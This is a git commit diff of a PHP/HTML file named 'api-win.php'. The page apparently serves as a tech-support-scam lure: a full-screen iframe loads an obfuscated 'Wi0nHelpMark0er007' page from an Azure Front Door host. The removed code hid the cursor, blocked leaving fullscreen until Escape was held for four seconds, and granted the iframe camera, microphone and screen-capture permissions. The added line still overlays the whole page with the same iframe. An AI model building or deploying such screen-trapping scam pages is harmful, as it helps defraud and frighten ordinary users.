deb75a7fa77a836a126cc506f0507ec1d311723f
rosioleydicondori-create <rosioleydicondori@gmail.com>
2026-06-24 15:48:11 +0530

    Update api-win.php

--- api-win.php
+++ api-win.php
@@ -2,82 +2,8 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title></title>
-<style>
-  iframe {
-    position: fixed;
-    width: 100%;
-    height: 100%;
-    border: none;
-    top: 0;
-    left: 0;
-  cursor: none;
-}
-</style>
-<script>
-let escTimer = null;
-let escHeld = false;
-
-document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape' && !escHeld) {
-        escHeld = true;
-
-        escTimer = setTimeout(() => {
-            if (document.fullscreenElement) {
-                document.exitFullscreen();
-            }
-        }, 4000); // 4 seconds
-    }
-});
-
-document.addEventListener('keyup', (e) => {
-    if (e.key === 'Escape') {
-        escHeld = false;
-        clearTimeout(escTimer);
-    }
-});
-</script>
 </head>
 <body>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
-
-<iframe 
-  id="f"
-  src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
-  allowfullscreen 
-  webkitallowfullscreen 
-  mozallowfullscreen 
-  allow="fullscreen *; pointer-lock *; keyboard-map *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
-</iframe>
-<html>
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title></title>
-<style>
-  iframe {
-    position: fixed;
-    width: 100%;
-    height: 100%;
-    border: none;
-    top: 0;
-    left: 0;
-  cursor: none;
-}
-</style>
-
-</head>
-<body>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
-
-<iframe 
-  id="f"
-  src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
-  allowfullscreen 
-  webkitallowfullscreen 
-  mozallowfullscreen 
-  allow="fullscreen *; pointer-lock *; keyboard-map *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *">
-</iframe>
-</body>
-</html>
-
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/><iframe src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" style="visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>
 </body>
 </html>
